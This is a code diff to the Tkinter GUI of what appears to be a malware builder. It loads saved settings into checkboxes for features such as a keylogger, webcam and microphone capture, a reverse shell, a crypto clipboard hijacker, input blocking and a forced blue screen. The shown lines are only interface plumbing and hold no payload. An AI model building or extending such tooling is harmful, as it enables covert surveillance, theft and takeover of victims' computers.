@@ -314,6 +314,7 @@ class Builder:
         )
         self.cb_keylogr.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['keylogr']))
         self.cb_keylogr.bind("<Leave>", self.hide_tooltip)
+        self.cbvar_keylogr.set(self.malware_configuration['functionalities']['keylogr'])
         self.canvas.create_window(x_start, y_start+y_delta*0, window=self.cb_keylogr, anchor='w')
 
         self.cbvar_scrnsht = tk.BooleanVar(value=True)
@@ -329,6 +330,7 @@ class Builder:
         )
         self.cb_scrnsht.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['scrnsht']))
         self.cb_scrnsht.bind("<Leave>", self.hide_tooltip)
+        self.cbvar_scrnsht.set(self.malware_configuration['functionalities']['scrnsht'])
         self.canvas.create_window(x_start, y_start+y_delta*1, window=self.cb_scrnsht, anchor='w')
 
         self.cbvar_fmanag = tk.BooleanVar(value=True)
@@ -344,6 +346,7 @@ class Builder:
         )
         self.cb_fmanag.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['f_manag']))
         self.cb_fmanag.bind("<Leave>", self.hide_tooltip)
+        self.cbvar_fmanag.set(self.malware_configuration['functionalities']['f_manag'])
         self.canvas.create_window(x_start, y_start+y_delta*2, window=self.cb_fmanag, anchor='w')
 
         self.cbvar_grabber = tk.BooleanVar(value=True)
@@ -359,6 +362,7 @@ class Builder:
         )
         self.cb_grabber.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['grabber']))
         self.cb_grabber.bind("<Leave>", self.hide_tooltip)
+        self.cbvar_grabber.set(self.malware_configuration['functionalities']['grabber'])
         self.canvas.create_window(x_start, y_start+y_delta*3, window=self.cb_grabber, anchor='w')
 
         self.cbvar_mclive = tk.BooleanVar(value=True)
@@ -374,6 +378,7 @@ class Builder:
         )
         self.cb_mclive.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['mc_live']))
         self.cb_mclive.bind("<Leave>", self.hide_tooltip)
+        self.cbvar_mclive.set(self.malware_configuration['functionalities']['mc_live'])
         self.canvas.create_window(x_start, y_start+y_delta*4, window=self.cb_mclive, anchor='w')
 
         self.cbvar_mcrecc = tk.BooleanVar(value=True)
@@ -389,6 +394,7 @@ class Builder:
         )
         self.cb_mcrecc.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['mc_recc']))
         self.cb_mcrecc.bind("<Leave>", self.hide_tooltip)
+        self.cbvar_mcrecc.set(self.malware_configuration['functionalities']['mc_recc'])
         self.canvas.create_window(x_start, y_start+y_delta*5, window=self.cb_mcrecc, anchor='w')
 
         self.cbvar_process = tk.BooleanVar(value=True)
@@ -404,6 +410,7 @@ class Builder:
         )
         self.cb_process.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['process']))
         self.cb_process.bind("<Leave>", self.hide_tooltip)
+        self.cbvar_process.set(self.malware_configuration['functionalities']['process'])
         self.canvas.create_window(x_start, y_start+y_delta*6, window=self.cb_process, anchor='w')
 
         self.cbvar_revshl = tk.BooleanVar(value=True)
@@ -419,6 +426,7 @@ class Builder:
         )
         self.cb_revshl.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['rev_shl']))
         self.cb_revshl.bind("<Leave>", self.hide_tooltip)
+        self.cbvar_revshl.set(self.malware_configuration['functionalities']['rev_shl'])
         self.canvas.create_window(x_start, y_start+y_delta*7, window=self.cb_revshl, anchor='w')
         
         self.cbvar_webcam = tk.BooleanVar(value=True)
@@ -434,6 +442,7 @@ class Builder:
         )
         self.cb_webcam.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['webcam_']))
         self.cb_webcam.bind("<Leave>", self.hide_tooltip)
+        self.cbvar_webcam.set(self.malware_configuration['functionalities']['webcam_'])
         self.canvas.create_window(x_start, y_start+y_delta*8, window=self.cb_webcam, anchor='w')
 
         self.cbvar_scrnrec = tk.BooleanVar(value=True)
@@ -449,6 +458,7 @@ class Builder:
         )
         self.cb_scrnrec.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['scrnrec']))
         self.cb_scrnrec.bind("<Leave>", self.hide_tooltip)
+        self.cbvar_scrnrec.set(self.malware_configuration['functionalities']['scrnrec'])
         self.canvas.create_window(x_start, y_start+y_delta*9, window=self.cb_scrnrec, anchor='w')
 
         self.cbvar_inputbl = tk.BooleanVar(value=True)
@@ -464,6 +474,7 @@ class Builder:
         )
         self.cb_inputbl.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['inputbl']))
         self.cb_inputbl.bind("<Leave>", self.hide_tooltip)
+        self.cbvar_inputbl.set(self.malware_configuration['functionalities']['inputbl'])
         self.canvas.create_window(x_start, y_start+y_delta*10, window=self.cb_inputbl, anchor='w')
 
         self.cbvar_crclipr = tk.BooleanVar(value=True)
@@ -479,6 +490,7 @@ class Builder:
         )
         self.cb_crclipr.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['crclipr']))
         self.cb_crclipr.bind("<Leave>", self.hide_tooltip)
+        self.cbvar_crclipr.set(self.malware_configuration['functionalities']['crclipr'])
         self.canvas.create_window(x_start*x_delta, y_start+y_delta*0, window=self.cb_crclipr, anchor='w')
 
         self.cbvar_messger = tk.BooleanVar(value=True)
@@ -494,6 +506,7 @@ class Builder:
         )
         self.cb_messger.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['messger']))
         self.cb_messger.bind("<Leave>", self.hide_tooltip)
+        self.cbvar_messger.set(self.malware_configuration['functionalities']['messger'])
         self.canvas.create_window(x_start*x_delta, y_start+y_delta*1, window=self.cb_messger, anchor='w')
 
         self.cbvar_txtspee = tk.BooleanVar(value=True)
@@ -509,6 +522,7 @@ class Builder:
         )
         self.cb_txtspee.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['txtspee']))
         self.cb_txtspee.bind("<Leave>", self.hide_tooltip)
+        self.cbvar_txtspee.set(self.malware_configuration['functionalities']['txtspee'])
         self.canvas.create_window(x_start*x_delta, y_start+y_delta*2, window=self.cb_txtspee, anchor='w')
 
         self.cbvar_audctrl = tk.BooleanVar(value=True)
@@ -524,6 +538,7 @@ class Builder:
         )
         self.cb_audctrl.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['audctrl']))
         self.cb_audctrl.bind("<Leave>", self.hide_tooltip)
+        self.cbvar_audctrl.set(self.malware_configuration['functionalities']['audctrl'])
         self.canvas.create_window(x_start*x_delta, y_start+y_delta*3, window=self.cb_audctrl, anchor='w')
 
         self.cbvar_monctrl = tk.BooleanVar(value=True)
@@ -539,6 +554,7 @@ class Builder:
         )
         self.cb_monctrl.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['monctrl']))
         self.cb_monctrl.bind("<Leave>", self.hide_tooltip)
+        self.cbvar_monctrl.set(self.malware_configuration['functionalities']['monctrl'])
         self.canvas.create_window(x_start*x_delta, y_start+y_delta*4, window=self.cb_monctrl, anchor='w')
 
         self.cbvar_webbloc = tk.BooleanVar(value=True)
@@ -554,6 +570,7 @@ class Builder:
         )
         self.cb_webbloc.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['webbloc']))
         self.cb_webbloc.bind("<Leave>", self.hide_tooltip)
+        self.cbvar_webbloc.set(self.malware_configuration['functionalities']['webbloc'])
         self.canvas.create_window(x_start*x_delta, y_start+y_delta*5, window=self.cb_webbloc, anchor='w')
 
         self.cbvar_jmpscar = tk.BooleanVar(value=True)
@@ -569,6 +586,7 @@ class Builder:
         )
         self.cb_jmpscar.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['jmpscar']))
         self.cb_jmpscar.bind("<Leave>", self.hide_tooltip)
+        self.cbvar_jmpscar.set(self.malware_configuration['functionalities']['jmpscar'])
         self.canvas.create_window(x_start*x_delta, y_start+y_delta*6, window=self.cb_jmpscar, anchor='w')
 
         self.cbvar_keystrk = tk.BooleanVar(value=True)
@@ -584,6 +602,7 @@ class Builder:
         )
         self.cb_keystrk.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['keystrk']))
         self.cb_keystrk.bind("<Leave>", self.hide_tooltip)
+        self.cbvar_keystrk.set(self.malware_configuration['functionalities']['keystrk'])
         self.canvas.create_window(x_start*x_delta, y_start+y_delta*7, window=self.cb_keystrk, anchor='w')
 
         self.cbvar_scrnman = tk.BooleanVar(value=True)
@@ -599,6 +618,7 @@ class Builder:
         )
         self.cb_scrnman.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['scrnman']))
         self.cb_scrnman.bind("<Leave>", self.hide_tooltip)
+        self.cbvar_scrnman.set(self.malware_configuration['functionalities']['scrnman'])
         self.canvas.create_window(x_start*x_delta, y_start+y_delta*8, window=self.cb_scrnman, anchor='w')
 
         self.cbvar_bluesod = tk.BooleanVar(value=True)
@@ -614,6 +634,7 @@ class Builder:
         )
         self.cb_bluesod.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['bluesod']))
         self.cb_bluesod.bind("<Leave>", self.hide_tooltip)
+        self.cbvar_bluesod.set(self.malware_configuration['functionalities']['bluesod'])
         self.canvas.create_window(x_start*x_delta, y_start+y_delta*9, window=self.cb_bluesod, anchor='w')
 
     def advanced_settings_window(self, context):
